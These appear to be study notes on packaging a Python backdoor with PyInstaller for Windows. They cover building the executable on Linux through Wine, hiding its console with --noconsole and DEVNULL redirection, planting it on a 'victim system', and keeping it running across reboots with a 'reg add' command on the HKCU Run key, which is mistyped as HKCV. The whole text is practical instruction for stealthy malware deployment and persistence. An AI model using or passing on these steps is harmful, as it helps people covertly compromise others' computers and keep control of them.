Packaging using pyinstaller

install pyinstaller to convert and pack all python code into 1 executable for the target operating system

pip install pyinstaller 
#for linux

c:\python27\python.exe -m pip install pyinstaller
or
c:\python27\scripts\pip.exe install pyinstaller
#for windows


Create python exe on windows system

c:\python27\scripts\pyinstaller.exe backdoor.py --onefile 
#pack all lib and support files in --onefile
#it will create a binary executable of backdoor it will execute when double click but with visible execution

c:\python27\scripts\pyinstaller.exe backdoor.py --onefile --noconsole
#to run invisible in background
in code for functions like check_output, redirect stdin and stderr to DEVNULL so no console appears even after --noconsole

#in python3
subprocess.check_output(commmad,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

#in python2
DEVNULL = open(os.devnull,"wb")
subprocess.check_output(commmad,shell=True,stderr=DEVNULL,stdin=DEVNULL)


To create a Python Executable it is better to do in the same os environment similar to your target
that is to run a py executable in windows, create the py exe in windows operating system so the required lib and 
modules are packaged and then put the py exe in victim system to run

Use windows Python Interpreter in Linux - example python-2.7.14.msi
wine is used to run windows software in linux

Install python executable in linux
wine msiexec /i python-2.7.15.amd64.msi
using this we get a normal windows installer similar to windows.

Location of wine installation of python - wine creates a virtual location for c drive of windows
~/.wine/drive_c/Python27/ - this will have the python.exe

pip install in windows interpreter of linux
~/.wine/drive_c/Python27/wine python.exe -m pip install pyinstaller

# to package a program, ensure all libraries it requires are already installed on the system.
install a package using pip - on linux using windows py interpreter
wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinput

# convert the main program file that references all other required files, pyinstaller will automatically
# package all required dependencies like other project code files and libraries


Maintain persistence by putting the script in startup programs, when the os boots these scripts always gets executed.

in windows Registry - this location has the startup apps
Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

in cmd prompt we can change value - to add to the startup apps list
reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "location of backdoor.exe"